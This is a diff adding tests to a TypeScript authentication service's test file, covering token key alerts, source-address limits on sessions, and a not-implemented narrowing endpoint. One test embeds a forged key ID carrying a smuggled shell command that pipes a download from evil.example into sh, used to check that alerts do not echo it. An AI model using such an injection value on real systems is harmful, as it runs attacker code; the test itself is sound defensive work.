@@ -251,6 +251,34 @@ test("a token signed by a key its binding's uploaded keys lack alerts the deploy
   assert.deepEqual(alerts.map((alert) => [alert.kind, alert.service, alert.binding]), [['unknown_key', DEPLOY, carried.id]]);
 });
 
+test('the alert shows the key a token names only as a kid is written, at most 64 characters: anything else names no key, and a kid that is no string is malformed', async (t) => {
+  t.mock.method(console, 'error', () => {});
+  const forged = `"; curl evil.example | sh #\n${'x'.repeat(20)}`;
+  // One service each: the alert is said once an hour per service.
+  const named: [string, string, string | null][] = [
+    ['shown', `kube-${'a'.repeat(59)}`, `kube-${'a'.repeat(59)}`],
+    ['forged', forged, null],
+    ['long', 'k'.repeat(65), null],
+  ];
+  for (const service of [...named.map(([name]) => name), 'numbered']) {
+    const of = `token:${service}`;
+    await write(world, ...rows('principals', principal(of)), ...rows('grants', grant(of, 'developer', { project: market })), ...rows('bindings', binding(of, { profile: 'custom', issuer: KUBE, jwksUri: `sha256:${createHash('sha256').update(KUBE_JWKS).digest('hex')}`, jwks: KUBE_JWKS, claims: canonicalClaims({ sub: 'system:serviceaccount:ci:runner' }), scope: VIEWER, policy: '{}' })));
+  }
+  for (const [service, kid, shown] of named) {
+    const token = idToken({ iss: KUBE, sub: 'system:serviceaccount:ci:runner' }, { key: kube2.privateKey, kid });
+    assert.deepEqual(reason(await signIn({ oidc: token }, { service })), [401, 'unknown_key'], service);
+    const alert = alerts.find((said) => said.service === `token:${service}`);
+    assert.ok(alert !== undefined, service);
+    if (shown === null) assert.match(alert.text, /its token names no key, not one uploaded for https:\/\/kubernetes\.acme\.example\./, service);
+    else assert.ok(alert.text.includes(`its token names key "${shown}", not one uploaded`), alert.text);
+    assert.doesNotMatch(alert.text, /curl|\n/);
+  }
+  // A kid that is no string is no token's header: refused before any key is looked for, and nothing said.
+  const numbered = idToken({ iss: KUBE, sub: 'system:serviceaccount:ci:runner' }, { key: kube2.privateKey, kid: 42 as unknown as string });
+  assert.deepEqual(reason(await signIn({ oidc: numbered }, { service: 'numbered' })), [401, 'malformed']);
+  assert.equal(alerts.some((said) => said.service === 'token:numbered'), false);
+});
+
 test("a role's signed GetCallerIdentity, naming this instance and the key, buys a session: STS asked once, the request as signed", async () => {
   const [made, calls, statements] = await cost(async () => signIn({ aws: await awsProof(jkt) }));
   assert.equal(made.status, 200, JSON.stringify(made.body));
@@ -300,6 +328,21 @@ test("renewal moves a session's expiry on an hour, by its key, with the gate's n
   assert.deepEqual([...reason(refused), refused.nonce !== null], [401, 'expired', true]);
 });
 
+// As 0.14.7 held a session to its binding's sources (test/workload-sessions.test.ts at v0.14.7, "a binding's sources hold a
+// session to its addresses"): every request, a renewal included, comes from within them; a logout ends it from anywhere.
+test("outside its binding's sources a session's requests and its renewal are refused; its logout is not", async () => {
+  const sourced = binding(DEPLOY, { claims: canonicalClaims(MAIN), scope: VIEWER, policy: '{"sources":["198.51.100.0/24"]}' });
+  await write(world, ...rows('bindings', sourced));
+  const token = await written(sourced, 600_000);
+  const outside = await asSession('/api/me', token, { method: 'GET' });
+  assert.deepEqual([...reason(outside), outside.body.message], [401, 'source', "192.0.2.7 is outside the binding's sources"]);
+  assert.deepEqual(reason(await asSession('/api/auth/workload/renew', token)), [401, 'source']);
+  const out = await asSession('/api/auth/logout', token);
+  assert.deepEqual([out.status, out.body.signedOut], [200, true]);
+  world.memory.callers.clear();
+  assert.deepEqual(reason(await asSession('/api/me', token, { method: 'GET' })), [401, 'unauthenticated']);
+});
+
 test('logout ends the session, with its key; without the proof, or as a bearer, it ends nothing', async () => {
   const token = await written(keyed, 600_000);
   assert.deepEqual(reason(await asSession('/api/auth/logout', token, { proof: false })), [401, 'dpop']);
@@ -309,4 +352,13 @@ test('logout ends the session, with its key; without the proof, or as a bearer, 
   assert.deepEqual([out.status, out.body.signedOut, out.nonce !== null], [200, true, true]);
   for (const kept of [world.memory.callers]) kept.clear();
   assert.equal((await asSession('/api/me', token, { method: 'GET' })).status, 401);
+});
+
+test("narrowing a session is not built, and says so as 0.14.7's stub did: 501, not a missing route, whoever asks and asking nothing", async () => {
+  const token = await written(keyed, 600_000);
+  for (const answered of [await asSession('/api/auth/workload/narrow', token), await read(await app.request('/api/auth/workload/narrow', { method: 'POST', headers: { 'content-type': 'application/json' }, body: '{}' }))]) {
+    assert.deepEqual([answered.status, answered.body.error, answered.body.message], [501, 'not_implemented', 'narrowing a session is not served yet']);
+  }
+  assert.deepEqual(app.calls, []);
+  assert.equal((await read(await app.request('/api/auth/workload/narrow'))).status, 405);
 });
